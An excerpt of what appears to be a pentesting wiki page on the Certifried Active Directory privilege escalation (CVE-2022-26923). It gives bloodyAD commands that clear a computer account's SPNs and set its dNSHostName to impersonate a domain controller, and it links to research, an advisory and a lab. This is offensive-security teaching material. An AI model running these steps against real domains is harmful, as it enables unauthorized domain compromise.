...
A patch was released in may 2022 to address this vulnerability: [more information here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4#db1c) and on [#certificate-mapping](/ad/movement/ad-cs/certificate-templates#certificate-mapping).
...
The first step of the attack consists in creating a computer account ([Create a computer account](/ad/movement/domain-settings/machineaccountquota#create-a-computer-account)), or have the write permission to the `dNSHostName` and `servicePrincipalName` attributes of another.
...
```bash
# Clearing the SPNs (v2: set object with no value clears the attribute)
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object "$COMPUTER_NAME$" serviceprincipalname

# Setting the dNSHostName value to the name of a computer account to impersonate
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD set object "$COMPUTER_NAME$" dnsHostName -v "$DC_NAME.$DOMAIN"

# Verifying the dNSHostName value and SPN entries
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get object "$COMPUTER_NAME$" --attr dnsHostName,serviceprincipalname
```
...
<ResourceCard href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4" title="research.ifcr.dk" description="research.ifcr.dk" icon="/assets/favicons/research.ifcr.dk.ico" />

<ResourceCard href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923" title="Security Update Guide - Microsoft Security Response Center" description="msrc.microsoft.com" icon="/assets/favicons/msrc.microsoft.com.svg" />

<ResourceCard href="https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html" title="https://cravaterouge.com/articles/ad-certifried/" description="cravaterouge.github.io" />

<ResourceCard href="https://tryhackme.com/room/cve202226923" title="tryhackme.com" description="tryhackme.com" />
